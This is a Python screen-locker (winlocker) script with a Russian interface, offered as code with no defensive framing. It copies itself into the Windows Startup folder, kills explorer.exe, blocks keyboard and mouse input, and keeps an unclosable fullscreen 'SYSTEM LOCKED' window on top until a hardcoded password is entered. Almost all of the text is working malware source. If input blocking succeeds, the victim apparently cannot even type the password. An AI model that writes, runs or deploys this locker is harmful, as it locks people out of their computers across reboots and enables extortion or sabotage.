import tkinter as tk
from tkinter import messagebox
import subprocess
import os
import ctypes
import shutil
import sys

PASSWORD = "word"

def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"),
        r"Microsoft\Windows\Start Menu\Programs\Startup")
    script_path = os.path.abspath(sys.argv[0])
    destination = os.path.join(startup_path, "locker.pyw")

    if not os.path.exists(destination):
        try:
            shutil.copyfile(script_path, destination)
        except Exception as e:
            print("Ошибка автозагрузки:", e)

def kill_explorer():
    subprocess.call(["taskkill", "/f", "/im", "explorer.exe"])

def restart_explorer():
    subprocess.Popen("explorer.exe")

def check_password():
    if entry.get() == PASSWORD:
        restart_explorer()
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")

def disable_event():
    pass

def force_focus():
    root.attributes('-topmost', 1)
    root.focus_force()
    root.after(1000, force_focus)

# Добавляем в автозагрузку
add_to_startup()

# GUI локер
root = tk.Tk()
root.title("LOCKED")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", disable_event)
root.configure(bg="black")

try:
    ctypes.windll.user32.BlockInput(True)
except:
    pass

kill_explorer()

label = tk.Label(root, text="СИСТЕМА ЗАБЛОКИРОВАНА", fg="red", bg="black", font=("Arial", 40))
label.pack(pady=100)

entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center')
entry.pack(pady=20)
entry.focus()

button = tk.Button(root, text="Разблокировать", command=check_password, font=("Arial", 20), bg="gray", fg="white")
button.pack()

force_focus()
root.mainloop()
